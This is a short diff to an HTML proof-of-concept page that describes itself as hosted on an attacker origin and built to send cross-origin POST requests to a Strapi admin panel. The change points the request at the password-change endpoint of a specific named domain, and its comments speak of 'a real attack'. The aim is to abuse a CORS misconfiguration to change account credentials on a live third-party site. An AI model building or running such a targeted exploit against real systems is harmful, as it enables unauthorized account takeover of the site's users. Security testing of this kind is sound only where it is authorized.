@@ -99,7 +99,7 @@
         <h1 class="header">CORS PoC (POST Request) for Strapi Admin Panel</h1>
         <p class="description">
             This page, hosted on a different origin (e.g., `attacker.com`), attempts to make a <strong>POST</strong> request to
-            `https://cms.bumba.global/admin`.
+            `/api/auth/change-password`.
             If the target server has a misconfigured CORS policy (e.g., `Access-Control-Allow-Origin: *` and
             `Access-Control-Allow-Credentials: true`),
             the response will be displayed below. Otherwise, the browser will block access due to the Same-Origin Policy.
@@ -127,7 +127,7 @@
             // Target URL for the POST request
             // For a real attack, this would be an API endpoint that processes POST data,
             // e.g., a login endpoint, a data submission endpoint, or an action endpoint.
-            const targetUrl = 'https://cms.bumba.global/admin'; // You might want to change this to a more specific POST endpoint
+            const targetUrl = 'https://cms.bumba.global/api/auth/change-password'; // You might want to change this to a more specific POST endpoint
             // Example: const targetUrl = 'https://cms.bumba.global/api/users'; // If adding a user
 
             // Data to send in the POST request body
